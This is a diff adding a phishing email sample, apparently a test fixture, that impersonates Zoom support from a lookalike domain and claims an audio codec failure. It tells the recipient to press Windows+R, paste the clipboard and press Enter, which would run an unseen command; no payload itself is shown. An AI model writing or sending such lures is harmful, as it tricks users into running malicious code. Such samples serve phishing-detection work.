@@ -1,0 +1,14 @@
+From: "Zoom Conference Support" <support@zoom-web-meetings.com>
+To: victim@company.com
+Subject: Critical Audio Codec Error: Conference Audio Initialization Failed
+Return-Path: <support@zoom-web-meetings.com>
+Reply-To: <support@zoom-web-meetings.com>
+Date: Fri, 16 Oct 2026 15:30:00 +0000
+Message-ID: <test-16-2026@mail-gateway.org>
+Authentication-Results: mx.company.com; spf=none dkim=none dmarc=none
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+Your meeting audio could not be connected due to an outdated WebRTC codec.
+
+To apply the hotfix immediately: Press Windows+R, then press Ctrl+V and enter to run the self-healing audio repair utility.
